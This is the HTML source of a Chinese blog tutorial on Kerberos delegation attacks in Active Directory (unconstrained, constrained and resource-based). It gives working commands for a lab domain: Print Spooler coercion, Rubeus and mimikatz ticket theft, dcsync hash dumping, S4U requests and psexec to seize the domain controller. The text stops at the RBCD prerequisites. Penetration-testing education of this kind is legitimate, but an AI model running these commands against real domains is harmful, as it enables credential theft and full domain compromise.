@@ -1,0 +1,1005 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="UTF-8">
+    
+    <link rel="apple-touch-icon" sizes="76x76" href="/img/website.jpg">
+    <link rel="icon" type="image/png" href="/img/website.jpg">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+    <title>Windows域渗透中对委派攻击的思考与实践article - siteKaGty1 &#39;s Personal Blog</title>
+    
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+    
+    
+    <meta name="description" content="">
+    <meta name="author" content="KaGty1">
+    <meta name="keywords" content="">
+    <meta property="og:title" content="Windows域渗透中对委派攻击的思考与实践"/>
+    <style>
+
+
+    
+    :root{
+        --shadow-color: rgba(0,0,0,0.2);
+        --sec-shadow: rgba(0,0,0,0.03);
+        --shadow-hover-color: rgba(0,0,0,0.28);
+        --first-text-color: #475b6d;
+        --second-text-color: #37475b;
+        --third-text-color: #858585;
+        --default-text-color: #505050;
+        --default-link-color: #007bff;
+        --link-color: #000000;
+        --second-link-color: #4F9BFA;
+        --code-color:rgba(27,31,35,.05);
+        --post-bkg-color: #fff;
+        --page-bkg-color: #f2f5f8;
+        --nav-a-hover-color: #3498db;
+        --post-sec-text-color: #718096;
+        --sec-bkg: #f2f5f8;
+        --color-mode: 'light';
+        --bkg-h: rgba(255,255,255,0.6);
+        --bkg-m: #e1e4e8;
+        --home-title-color: #4169E1;
+        --shadow: 0 4px 10px rgba(0,2,4,0.06),0 0 1px rgba(0,2,4,0.11);
+        --hr-color: #ddd;
+        --bg-t: rgba(255, 255, 255, 0.8);
+        --nav-bkg: rgba(255,255,255,0.6);
+    }
+
+@media (prefers-color-scheme: dark) {
+  :root {
+    --color-mode: 'dark';
+  }
+
+  :root:not([data-theme]) {
+    --first-text-color: hsla(0,0%,100%,0.92);
+    --second-text-color: hsla(0,0%,100%,0.86);
+    --third-text-color: #a7a9ad;
+    --default-text-color: #505050;
+    --default-link-color: #1589e9;
+    --link-color: #000000;
+    --second-link-color: #30a9de;
+    --post-bkg-color: #252d38;
+    --page-bkg-color: #181c27;
+    --nav-a-hover-color: #3498db;
+    --post-sec-text-color: #a7a9ad;
+    --sec-bkg: #364151;
+    --bkg-h: rgba(255,255,255,0.2);
+    --bkg-m: rgba(255,255,255,0.1);
+    --home-title-color: rgb(226, 82, 90);
+    --code-color:#3e4b5e;
+    --shadow: none;
+    --hr-color: #718096;
+    --bg-t: #364151;
+    --nav-bkg: rgba(13,17,23,0.6);
+  }
+}
+
+[data-theme='dark'] {
+    --shadow-color: rgba(0,0,0,0.2);
+    --shadow-hover-color: rgba(0,0,0,0.28);
+    --first-text-color: hsla(0,0%,100%,0.92);
+    --second-text-color: hsla(0,0%,100%,0.86);
+    --third-text-color: #a7a9ad;
+    --default-text-color: #505050;
+    --default-link-color: #1589e9;
+    --link-color: #000000;
+    --second-link-color: #30a9de;
+    --post-bkg-color: #252d38;
+    --page-bkg-color: #181c27;
+    --nav-a-hover-color: #3498db;
+    --post-sec-text-color: #a7a9ad;
+    --sec-bkg: #364151;
+    --bkg-h: rgba(255,255,255,0.2);
+    --bkg-m: rgba(255,255,255,0.1);
+    --home-title-color: rgb(226, 82, 90);
+    --code-color:#3e4b5e;
+    --shadow: none;
+    --hr-color: #718096;
+    --bg-t: #364151;
+    --nav-bkg: rgba(13,17,23,0.6);
+}
+
+</style>
+
+
+
+<style>
+#page-main,footer,.p-btn{
+    display: none;
+}
+html, body {
+    margin: 0;
+    padding: 0;
+    width: 100%;
+    height: 100%;
+}
+body {
+    background-color: var(--page-bkg-color);
+    color: var(--second-text-color);
+    overflow-y: scroll;
+    overflow-x: hidden;
+    transition: all .3s;
+}
+a {
+    color: var(--default-link-color);
+    text-decoration: none;
+    background-color: transparent;
+}
+a:hover{
+    color: var(--second-link-color);
+}
+.main-content,.post-card-main{
+    margin: 30px;
+}
+
+
+
+@media (max-width: 410px){
+    .post-card-main{
+        max-width: 350px!important;
+    }
+}
+
+@media (max-width: 980px){
+    .post-card-main{
+        max-width: 520px!important;
+    }
+}
+
+
+@media (min-width: 780px){ 
+    h3{
+        font-size: 1.5rem;
+        line-height: 1.5em;
+    }
+}
+@media (min-width: 1280px){ 
+    h3{
+        font-size: 1.7rem;
+        line-height: 1.5em;
+    }
+}
+@media (min-width: 2096px){ 
+    h3{
+        font-size: 1.8rem;
+        line-height: 1.5em;
+    }
+}
+
+.text-center{
+    text-align: center!important;
+}
+.middle-center{
+    display: -webkit-box;
+    display: -ms-flexbox;
+    display: flex;
+    -webkit-box-align: center;
+    -ms-flex-align: center;
+    align-items: center;
+    -webkit-box-pack: center;
+    -ms-flex-pack: center;
+    justify-content: center;
+    height: 100%;
+}
+header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    position: fixed;
+    height: 54px;
+    padding: 0 1.25rem;
+    top: 0;
+    left: 0;
+    right: 0;
+    z-index: 10;
+    border-bottom: 1px solid var(--bkg-m);
+    background-color: var(--nav-bkg);
+    backdrop-filter: blur(4px);
+    transition: all .3s;
+}
+header .header__left, header .header__right {
+    display: flex;
+    align-items: center;
+    font-family: rubik,sans-serif,Varela Round;
+}
+header .header__left .logo__text {
+    font-size: 18px;
+    font-weight: 450;
+    padding: 14.5px 10px;
+    border-radius: 5px;
+    color: var(--second-text-color);
+}
+header .header__right .navbar__menus {
+    height: 54px;
+    padding: 0 0 0 15px;
+}
+header .header__right .button {
+    color: var(--second-text-color);
+}
+header .header__right .navbar__menus .navbar-menu {
+    display: inline-block;
+    align-items: center;
+    height: 54px;
+    padding: 0 10px;
+    font-size: 16px;
+    line-height: 54px;
+}
+header .header__right .dropdown-icon {
+    display: none;
+    height: 54px;
+    padding: 15px 10px;
+    border: 0;
+    background-color: transparent;
+}
+header .header__right .dropdown-menus {
+    line-height: 2rem;
+    animation: slide-in .15s ease 1;
+    display: none;
+    position: absolute;
+    left: 12px;
+    right: 12px;
+    top: calc(54px + 10px);
+    border-radius: 6px;
+    padding: 24px;
+    background-color: var(--page-bkg-color);
+    border: 1px solid var(--bkg-m);
+    z-index: 9999;
+    justify-items: center;
+    justify-content: center;
+    flex-direction: column;
+}
+header .header__right #btn-search, header .header__right #btn-toggle-dark{
+    display: inline-block;
+    padding:  18px 10px;
+    height: 25px;
+}
+header .header__right #btn-dropdown{
+  display: inline-block;
+  padding:  13.5px 0;
+}
+header .header__right .dropdown-menus .dropdown-menu {
+    padding: 10px;
+    color: var(--second-text-color);
+}
+@media screen and (max-width: 764px){
+.navbar__menus {
+    display: none!important;
+}
+.dropdown-icon {
+    display: inline-block!important;
+}
+}
+.p-btn{
+    position: fixed;
+    bottom: 1.2rem;
+    right: 1.2rem;
+    contain: layout;
+}
+.toc-btn,.click-btn{
+    cursor: pointer;
+    -webkit-appearance: none;
+    -moz-appearance: none;
+    appearance: none;
+    align-items: center;
+    margin-top: .5rem;
+    font-size: .75rem;
+    background-color: var(--sec-bkg);
+    display: block;
+    padding: 0.9rem;
+    box-shadow: 0 0.3rem 0.6rem rgba(48,55,66,.15);
+    border: none;
+    border-radius: 0.5rem;
+    line-height: 1;
+    color: var(--first-text-color);
+}
+.toc-link{
+    color: var(--second-text-color);
+}
+
+#css-loading h3{
+    font-weight: 500;
+    font-size: 1.4rem;
+    text-align: center;
+    position: fixed;
+    top: 200px;
+    left: 0;
+    right: 0;
+    opacity: 0;
+    animation: cssLoad;
+    animation-delay: 0.3s;
+    -webkit-animation: cssLoad;
+    -webkit-animation-delay: 0.3s;
+}
+@keyframes cssLoad {
+    from {
+        opacity: 0;
+    }
+    to {
+        opacity: 0.9;
+    }
+}
+
+
+.memorial {
+    -webkit-filter: grayscale(100%);
+    -moz-filter: grayscale(100%);
+    -ms-filter: grayscale(100%);
+    -o-filter: grayscale(100%);
+    filter: grayscale(100%);
+    filter:progid:DXImageTransform.Microsoft.BasicImage(grayscale=1); filter:gray;
+}
+
+
+    .post-copyright:after {
+        position: absolute;
+        color: #fff;
+        background: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 496 512'%3E%3Cpath fill='gray' d='M245.8 214.9l-33.2 17.3c-9.4-19.6-25.2-20-27.4-20-22.2 0-33.3 14.6-33.3 43.9 0 23.5 9.2 43.8 33.3 43.8 14.4 0 24.6-7 30.5-21.3l30.6 15.5a73.2 73.2 0 01-65.1 39c-22.6 0-74-10.3-74-77 0-58.7 43-77 72.6-77 30.8-.1 52.7 11.9 66 35.8zm143 0l-32.7 17.3c-9.5-19.8-25.7-20-27.9-20-22.1 0-33.2 14.6-33.2 43.9 0 23.5 9.2 43.8 33.2 43.8 14.5 0 24.7-7 30.5-21.3l31 15.5c-2 3.8-21.3 39-65 39-22.7 0-74-9.9-74-77 0-58.7 43-77 72.6-77C354 179 376 191 389 214.8zM247.7 8C104.7 8 0 123 0 256c0 138.4 113.6 248 247.6 248C377.5 504 496 403 496 256 496 118 389.4 8 247.6 8zm.8 450.8c-112.5 0-203.7-93-203.7-202.8 0-105.5 85.5-203.3 203.8-203.3A201.7 201.7 0 01451.3 256c0 121.7-99.7 202.9-202.9 202.9z'/%3E%3C/svg%3E");
+        content: ' ';
+        height: 10rem;
+        width: 10rem;
+        right: -2rem;
+        top: -2rem;
+        opacity: .1;
+    }
+
+</style>
+
+    
+
+    
+        <!--
+        <link rel="stylesheet" href="/css/page.css" media="print"
+            onload="this.media='all';this.onload=null">
+        <noscript>-->
+            <link rel="stylesheet" href="/css/page.css">
+        <!--</noscript>-->
+    
+    
+    <link rel="stylesheet" href="/css/main.css" media="print" onload="this.media='all';this.onload=null">
+    <noscript>
+        <link rel="stylesheet" href="/css/main.css">
+    </noscript>
+
+    
+    <script src="/js/main.js"></script>
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+    <body>
+        <header>
+            
+<div class="header__left">
+	<a href="/" class="button"><span class="logo__text">KaGty1 &#39;s Personal Blog</span></a>
+</div>
+<div class="header__right">
+	<div class="navbar__menus">
+		
+		<a href="/" class="button">
+			<div class="navbar-menu">首页</div>
+		</a>
+		
+		<a href="/archives/" class="button">
+			<div class="navbar-menu">博文</div>
+		</a>
+		
+		<a href="/categories/" class="button">
+			<div class="navbar-menu">分类</div>
+		</a>
+		
+		<a href="/talk/" class="button">
+			<div class="navbar-menu">说说</div>
+		</a>
+		
+		<a href="/links/" class="button">
+			<div class="navbar-menu">友链</div>
+		</a>
+		
+	</div>
+	
+	<a href="/search/" class="button">
+		<div id="btn-search">
+			<svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 1024 1024" width="24" height="24" fill="currentColor"
+				stroke="currentColor" stroke-width="32">
+				<path
+					d="M192 448c0-141.152 114.848-256 256-256s256 114.848 256 256-114.848 256-256 256-256-114.848-256-256z m710.624 409.376l-206.88-206.88A318.784 318.784 0 0 0 768 448c0-176.736-143.264-320-320-320S128 271.264 128 448s143.264 320 320 320a318.784 318.784 0 0 0 202.496-72.256l206.88 206.88 45.248-45.248z">
+				</path>
+			</svg>
+		</div>
+	</a>
+	
+	<a href="javaScript:void(0);" class="button" id="btn-toggle-dark">
+		<div>
+			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewbox="0 0 24 24" fill="none"
+				stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+				<path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+			</svg>
+		</div>
+	</a>
+	<a href="javaScript:void(0);" class="dropdown-icon button">
+		<div id="btn-dropdown">
+			<svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 1024 1024" width="24" height="24" fill="currentColor"
+				stroke="currentColor" stroke-width="32" stroke-linecap="round">
+				<path
+					d="M903.43 561.52H148.8c-13.25 0-24-10.75-24-24s10.75-24 24-24h754.63c13.25 0 24 10.75 24 24s-10.75 24-24 24zM903.43 204.31H148.8c-13.25 0-24-10.75-24-24s10.75-24 24-24h754.63c13.25 0 24 10.75 24 24s-10.75 24-24 24zM903.43 918.73H148.8c-13.25 0-24-10.75-24-24s10.75-24 24-24h754.63c13.25 0 24 10.75 24 24s-10.75 24-24 24z"
+					fill="currentColor"></path>
+			</svg>
+		</div>
+	</a>
+	<div class="dropdown-menus" id="dropdown-menus">
+		
+		<a href="/" class="dropdown-menu button">首页</a>
+		<br>
+		
+		<a href="/archives/" class="dropdown-menu button">博文</a>
+		<br>
+		
+		<a href="/categories/" class="dropdown-menu button">分类</a>
+		<br>
+		
+		<a href="/talk/" class="dropdown-menu button">说说</a>
+		<br>
+		
+		<a href="/links/" class="dropdown-menu button">友链</a>
+		<br>
+		
+	</div>
+</div>
+
+        </header>
+        <div id="top"></div>
+        <div id="page-main" class="main-content">
+        <div class="mg-top">
+            
+
+<article class="page">
+<div id="post-meta-m">
+    <div class="post-meta" id="post-meta">
+  <h3>Windows域渗透中对委派攻击的思考与实践</h3>
+    
+      <span class="post-meta-label">
+        KaGty1
+      </span>
+    
+    
+      <span class="post-meta-label">
+        <span class="p-dot"></span>
+        <time datetime="2025-06-04 13:57" pubdate>
+          2025-06-04
+        </time>
+      </span>
+    
+    
+      
+      <span class="post-meta">
+        <span class="p-dot"></span>
+        共 3.6k 字
+      </span>
+    
+    
+      
+      <span class="post-meta">
+        <span class="p-dot"></span>
+        
+        预计 
+        39
+         分钟
+      </span>
+    
+    
+      
+      <span class="post-meta">
+        <span class="p-dot"></span>
+        <span id="busuanzi_container_page_pv">
+          共 <span id="busuanzi_value_page_pv"></span> 次阅读
+        </span>
+      </span>
+    
+  </div>
+  
+</div>
+<div class="article-m">
+  <div class="post-toc">
+    
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E4%B8%8E%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="toc-number">1.</span> <span class="toc-text">约束委派与非约束委派</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-number">1.1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.</span> <span class="toc-text">非约束性委派利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8"><span class="toc-number">1.3.</span> <span class="toc-text">约束性委派利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE-RBCD"><span class="toc-number">2.</span> <span class="toc-text">基于资源的约束委派[RBCD]</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#RBCD%E6%A6%82%E8%BF%B0"><span class="toc-number">2.1.</span> <span class="toc-text">RBCD概述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8%E6%A6%82%E8%BF%B0"><span class="toc-number">2.2.</span> <span class="toc-text">攻击利用概述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">2.3.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%9F%E7%94%A8%E6%88%B7%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83"><span class="toc-number">2.4.</span> <span class="toc-text">域用户本地提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%9F%E5%86%85%E6%9C%8D%E5%8A%A1%E8%B4%A6%E6%88%B7%E6%8F%90%E6%9D%83"><span class="toc-number">2.5.</span> <span class="toc-text">域内服务账户提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NTLM-Relay-to-ldap-RBCD"><span class="toc-number">2.6.</span> <span class="toc-text">NTLM Relay to ldap + RBCD</span></a></li></ol></li></ol>
+    
+  </div>
+    <div id="article">
+      <div id="post-content" class="markdown-body textretty">
+        <h3 id="约束委派与非约束委派"><a href="#约束委派与非约束委派" class="headerlink" title="约束委派与非约束委派"></a>约束委派与非约束委派</h3><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p><strong>非约束性委派 (Unconstrained Delegation)</strong>：老板给了某位员工一把万能钥匙，可以打开公司的所有门。当用户&#x2F;服务访问设置了非约束性委派的目标主机时, <code>TGT</code>会被目标主机的<code>LSASS </code>(系统安全服务) 进程缓存到内存中,  就相当于老板给员工钥匙的这个过程。</p>
+<p><strong>约束委派 (Constrained Delegation)</strong>：老板给了某位员工一把钥匙，但是只能打开公司财务部的门</p>
+<h4 id="非约束性委派利用"><a href="#非约束性委派利用" class="headerlink" title="非约束性委派利用"></a>非约束性委派利用</h4><p>有权修改计算机对象属性的人通过设置对象的<code>userAccountControl</code>标志位中的<code>TRUSTED_FOR_DELEGATION</code>位为<code>true</code>，就可以启用非约束性委派</p>
+<p>若通过漏洞&#x2F;配置不当获取形如<code>GenericWrite</code>写权限 (可以修改计算机对象的任何属性) , <code>WriteProperty</code> (被授权对某个特定属性的写权限), 可以尝试利用<code>PowerShell</code>命令设置非约束性委派, 配合打印机漏洞等实现横向移动</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ADAccountControl</span> <span class="literal">-Identity</span> <span class="string">&quot;test-PC<span class="variable">$</span>&quot;</span> <span class="literal">-TrustedForDelegation</span> <span class="variable">$true</span>  //Powershell设置非约束性委派</span><br><span class="line"><span class="built_in">Get-ADComputer</span> <span class="literal">-Identity</span> <span class="string">&quot;test-PC<span class="variable">$</span>&quot;</span> <span class="literal">-Properties</span> TrustedForDelegation | <span class="built_in">Select-Object</span> Name, TrustedForDelegation  //查看是否设置成功</span><br><span class="line"><span class="built_in">Set-ADAccountControl</span> <span class="literal">-Identity</span> <span class="string">&quot;test-PC<span class="variable">$</span>&quot;</span> <span class="literal">-TrustedForDelegation</span> <span class="variable">$false</span>  //Powershell关闭非约束性委派</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250603162214641.png" alt="image-20250603162214641"></p>
+<p><strong>非约束性委派 + 打印机漏洞 Print Spooler</strong></p>
+<p>Print Spooler服务Windows中默认开启</p>
+<p>可以进行利用让域管的机器账号强制与我们拿下的非约束性委派的主机强行建立连接, 利用<code>Rubeus</code>工具监听<code>LSASS</code>进程从而捕获域管机器账户的<code>TGT</code>, 最后将票据注入内存, 实现提权, 结合<code>mimikatz</code>导出域内哈希进行横向移动</p>
+<p>用<code>Rubeus</code>监听来自域控的票据</p>
+<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe<span class="built_in"> monitor </span>/interval:2 /filteruser:DC$ </span><br></pre></td></tr></table></figure>
+
+<p><code>Print Spooler</code>利用工具 : <code>https://github.com/leechristensen/SpoolSample</code></p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">SpoolSample.exe</span> DC test-<span class="built_in">PC</span></span><br></pre></td></tr></table></figure>
+
+<p><code>Rubeus</code>监听到<code>DC$</code>的<code>TGT</code>票据, 导入票据</p>
+<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe ptt /ticket:doIFGjCCBRagAwIBBaEDAgEWooIEIzCCBB9hggQbM<span class="params">...</span><span class="params">...</span></span><br></pre></td></tr></table></figure>
+
+<p>将票据注入内存中, 使用<code>mimikatz</code>导出域内用户哈希, <code>PTH</code>进行域内横向</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz<span class="selector-class">.exe</span> <span class="string">&quot;log&quot;</span> <span class="string">&quot;lsadump::dcsync /all /csv&quot;</span> <span class="string">&quot;exit&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="约束性委派利用"><a href="#约束性委派利用" class="headerlink" title="约束性委派利用"></a>约束性委派利用</h4><p>约束性委派中，<code>kerberos</code>引入了<code>S4U2Self</code>和<code>S4U2Proxy</code>两种核心拓展机制。</p>
+<p><code>S4U2Self</code>：</p>
+<p>当某个服务（如Web服务器）收到用户请求时，它需要确认用户的身份和权限。此时，服务可以通过<code>S4U2Self</code>向<code>KDC</code>（密钥分发中心）申请一个<strong>针对自身的服务票据</strong>，这个票据是“模拟用户身份”生成的。</p>
+<p><code>S4U2Proxy</code>：</p>
+<p>当服务需要代表用户访问<strong>其他后端服务</strong>（如数据库、文件服务器）时，<code>S4U2Proxy</code>允许服务使用用户的票据向<code>KDC</code>申请目标服务的访问权限。</p>
+<p>配置了约束性委派的账户的<code>userAccountControl</code>属性会被设置为<code>TRUSTED_TO_AUTH_FOR_DELEGATION</code>，账户的<code>msDS-AllowedToDelegateTo</code>属性为允许委派的服务。</p>
+<p><strong>攻击步骤</strong></p>
+<p>(1) 攻击者拿到了配置了约束委派的服务账户&#x2F;域内机器账户，并且已经利用<code>mimikatz</code>等工具导出了账户哈希、票据等信息。</p>
+<p>(2) 通过<code>S4U2Self &amp;&amp; S4U2Proxy</code>来获取获取<code>ST</code></p>
+<p>攻击者用服务账户&#x2F;域内机器账户的权限，向<code>KDC</code>发起<code>S4U2Self</code>请求，模拟某个高权限用户(如域管)生成针对自身的服务票据，将<code>S4U2Self</code>生成的票据转发给目标服务(如域控的<code>CIFS</code>服务)，可获取访问的<code>ST</code></p>
+<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">通俗解释：</span><br><span class="line">假设你是一家公司的IT部门（对应服务账户WIN10-<span class="number">1</span><span class="variable">$）</span>，老板（对应域管理员Administrator）让你帮忙申请一张门禁卡（Kerberos票据），这张卡可以打开财务部的门（CIFS/DC2016.redteam.lab服务）。</span><br><span class="line">但你作为IT部门，必须去公司总部的门禁中心（KDC/域控制器）申请这张卡。申请时你需要告诉门禁中心：“老板让我申请这张卡，请验证他是否真的有权限开门。”</span><br><span class="line">门禁中心会检查老板的权限，如果确实有权，就会给你一张写有老板名字的门禁卡（模拟用户身份的票据）。</span><br><span class="line">拿到卡后，你可以用它去财务部开门（访问目标服务），仿佛你就是老板本人。</span><br></pre></td></tr></table></figure>
+
+
+
+<p><code>DC</code>域控给<code>test-PC</code>主机设置了约束性委派，允许委派<code>DC</code>的<code>CIFS</code>服务</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250604124847196.png" alt="image-20250604124847196"></p>
+<p>攻击者拿下了<code>test-PC</code>这台机器，目标是利用约束委派横向拿下<code>DC</code>域控</p>
+<p><strong>(1) 利用<code>test-PC</code>机器用户票据 + <code>kekeo</code>横向</strong></p>
+<p>先使用<code>mimikatz</code>导出票据，拿到机器用户票据</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz<span class="selector-class">.exe</span> <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::tickets /export&quot;</span> <span class="string">&quot;exit&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250604125652827.png" alt="image-20250604125652827"></p>
+<p><code>kekeo</code>申请<code>ST</code></p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo<span class="selector-class">.exe</span> &quot;tgs::s4u /tgt:[<span class="number">0</span>;<span class="number">3</span>e7]-<span class="number">2</span>-<span class="number">0</span>-<span class="number">60</span>a10000-TEST-PC$<span class="keyword">@krbtgt-HACK-MY</span>.COM.kirbi /<span class="attribute">user</span>:Administrator<span class="keyword">@hack-my</span>.com /<span class="attribute">service</span>:cifs/DC.hack-my.com<span class="string">&quot; &quot;</span>exit<span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250604130716639.png" alt="image-20250604130716639"></p>
+<p>利用<code>mimikatz</code>导入<code>ST</code>票据</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;kerberos::ptt TGS_Administrator<span class="variable">@hack</span>-my.com<span class="variable">@HACK</span>-MY.COM_cifs~DC.hack-my.com<span class="variable">@HACK</span>-MY.COM.kirbi&quot;</span> <span class="string">&quot;exit&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>导入后可正常访问<code>DC</code>的<code>cifs</code>服务</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250604130910457.png" alt="image-20250604130910457"></p>
+<p>(2) 利用<code>test-PC</code>机器用户<code>Hash</code> + <code>getST</code> + <code>psexec</code>拿下域控<code>system</code>权限</p>
+<p>先导出<code>test-PC</code>机器用户<code>NTLM Hash</code></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz<span class="selector-class">.exe</span> <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::logonpasswords&quot;</span> <span class="string">&quot;log&quot;</span> <span class="string">&quot;exit&quot;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NTLM Hash : 4631044<span class="type">bac1ad6054011e1750eb0af84</span></span><br></pre></td></tr></table></figure>
+
+<p><code>getST</code>申请<code>ST</code></p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python</span> getST.<span class="keyword">py</span> -dc-ip <span class="number">192.168</span>.<span class="number">43.100</span> -spn CIFS/DC.hack-my.<span class="keyword">com</span> -impersonate administrator hack-my.<span class="keyword">com</span>/test-PC$ -hashes :<span class="number">4631044</span>bac1ad6054011e1750eb0af84</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250604131538268.png" alt="image-20250604131538268"></p>
+<p>导入票据 + <code>psexec</code>利用，拿下域控<code>system</code>权限</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">set</span> KRB5CCNAME=administrator<span class="variable">@CIFS_DC</span>.hack-my.com<span class="variable">@HACK</span>-MY.COM.ccache</span><br><span class="line">python psexec.py -<span class="literal">no</span>-pass -k DC.hack-my.com -target-ip <span class="number">192.168.43.100</span> -dc-ip <span class="number">192.168.43.100</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250604131756308.png" alt="image-20250604131756308"></p>
+<h3 id="基于资源的约束委派-RBCD"><a href="#基于资源的约束委派-RBCD" class="headerlink" title="基于资源的约束委派[RBCD]"></a>基于资源的约束委派[RBCD]</h3><h4 id="RBCD概述"><a href="#RBCD概述" class="headerlink" title="RBCD概述"></a>RBCD概述</h4><p>基于资源的约束委派 (<code>Resource-Based Constrained Delegation</code>)是<code>Windows Server 2012</code>引入的权限委派机制，其核心思想是<strong>将委派控制权交给资源自身</strong>。通俗解释：仓库管理员自主决定谁可以来提货</p>
+<p><strong>传统委派</strong>：<code>Service </code>A可以代理用户访问<code>Service B</code>，需要域管将<code>Service A</code>的<code>msDS-AllowedToDelegateTo</code>属性指定为<code>Service B</code></p>
+<p><strong>RBCD</strong>：<code>Service B</code>自主决定”<strong>谁可以代理用户访问我</strong>“，比如指定<code>Service A</code>可以代理用户访问我，只需要在<code>Service B</code>上将<code>msDS-AllowedToActOnBehalfOfOtherIndentity</code>属性指定为<code>Service A</code>即可。</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250601093904614.png" alt="image-20250601093904614"></p>
+<h4 id="攻击利用概述"><a href="#攻击利用概述" class="headerlink" title="攻击利用概述"></a>攻击利用概述</h4><p>攻击者可以利用<code>RBCD</code>来伪造身份票据来访问特定服务。攻击者创建一个机器账户 - <code>HackPC$</code>，并将其<code>SID</code>写入<code>Service B</code>的<code>msDS-AllowedToActOnBehalfOfOtherIndentity</code>中，然后伪造成为域管来访问<code>Service B</code></p>
+<h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><p><strong>拥有修改<code>msDS-AllowedToActOnBehalfOfOtherIndentity</code>的权限</strong></p>
+<p>(1) 将机器加入域的用户</p>
+<p>(2) 拥有<code>Account Operators</code>组权限的账户 (可管理除域控外的机器)</p>
+<p>(3) 对目标主机具备<code>GenericAll</code>、<code>WriteProperty</code>等写权限的账户</p>
+<p>(4) 该主机的机器账户</p>
